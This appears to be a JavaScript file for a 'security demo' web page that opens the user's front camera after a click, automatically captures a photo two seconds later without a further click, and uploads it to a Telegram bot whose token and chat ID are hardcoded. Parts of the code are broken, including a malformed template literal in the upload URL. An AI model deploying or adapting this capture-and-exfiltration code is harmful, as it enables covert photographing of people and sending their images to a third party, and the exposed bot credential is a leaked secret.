// == CONFIGURATION - REPLACE THESE ==
const BOT_TOKEN = '8653963776:AAGzZRBa4Z_8N0kfodDCIFTeshDxWQfxF8s';  // FROM BOTFATHER
const CHAT_ID = '8404101414';      // FROM getUpdates
// ================================

let videoStream = null;
let videoElement = document.getElementById('video');
let placeholder = document.getElementById('placeholder');
let screenshotPreview = document.getElementById('screenshot-preview');
let startBtn = document.getElementById('startCamera');
let screenshotBtn = document.getElementById('takeScreenshot');
let statusDiv = document.getElementById('status');

// Function to send photo to Telegram
async function sendPhotoToTelegram(imageData) {
    statusDiv.innerHTML = '📤 Sending photo to Telegram...';
    
    try {
        // Convert base64 to blob
        const response = await fetch(imageData);
        const blob = await response.blob();
        
        const formData = new FormData();
        formData.append('8404101414', CHAT_ID);
        formData.append('photo', blob, 'camera_shot.jpg');
        formData.append('caption', '📸 Camera capture from demo page');

        const telegramResponse = await fetch(`https://api.telegram.org/bot${8653963776:AAGzZRBa4Z_8N0kfodDCIFTeshDxWQfxF8s}/sendPhoto`, {
            method: 'POST',
            body: formData
        });

        const result = await telegramResponse.json();
        
        if (result.ok) {
            statusDiv.innerHTML = '✅ Photo sent to Telegram successfully!';
        } else {
            statusDiv.innerHTML = '❌ Failed to send to Telegram. Check bot token.';
            console.error('Telegram error:', result);
        }
    } catch (error) {
        statusDiv.innerHTML = '❌ Error: ' + error.message;
        console.error('Error:', error);
    }
}

// Take screenshot from video stream
function takeScreenshot() {
    if (!videoStream) {
        alert('Start camera first!');
        return;
    }
    
    statusDiv.innerHTML = '📸 Taking photo...';
    
    // Create canvas and draw video frame
    const canvas = document.createElement('canvas');
    canvas.width = videoElement.videoWidth;
    canvas.height = videoElement.videoHeight;
    const context = canvas.getContext('2d');
    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
    
    // Convert to image
    const imageData = canvas.toDataURL('image/jpeg', 0.9);
    
    // Show preview
    screenshotPreview.src = imageData;
    screenshotPreview.style.display = 'block';
    videoElement.style.display = 'none';
    placeholder.style.display = 'none';
    
    // Send to Telegram
    sendPhotoToTelegram(imageData);
}

// Start camera when user clicks button
async function startCamera() {
    statusDiv.innerHTML = '📷 Requesting camera access...';
    
    try {
        // This ONLY works because user clicked a button
        videoStream = await navigator.mediaDevices.getUserMedia({ 
            video: {
                width: { ideal: 640 },
                height: { ideal: 480 },
                facingMode: "user"  // front camera
            }, 
            audio: false 
        });
        
        // Connect stream to video element
        videoElement.srcObject = videoStream;
        videoElement.style.display = 'block';
        placeholder.style.display = 'none';
        screenshotPreview.style.display = 'none';
        
        // Show screenshot button
        screenshotBtn.style.display = 'inline-block';
        startBtn.style.display = 'none';
        
        statusDiv.innerHTML = '✅ Camera active! Click "Take Photo" to capture and send to Telegram';
        
        // For demo: auto-take first photo after 2 seconds (to show automation risk)
        setTimeout(() => {
            if (videoStream) {
                takeScreenshot();
                statusDiv.innerHTML = '⚠️ DEMO: Auto-capture happened! Imagine if this ran every 5 seconds...';
            }
        }, 2000);
        
    } catch (error) {
        statusDiv.innerHTML = '❌ Camera access denied: ' + error.message;
        console.error('Camera error:', error);
        alert('Camera access was denied. This is GOOD for security!');
    }
}

// Event listeners
startBtn.addEventListener('click', startCamera);
screenshotBtn.addEventListener('click', takeScreenshot);

// Clean up when page closes
window.addEventListener('beforeunload', () => {
    if (videoStream) {
        videoStream.getTracks().forEach(track => track.stop());
    }
});

// Show security warning
console.log('🔒 Security Demo: This page requires user click to access camera');
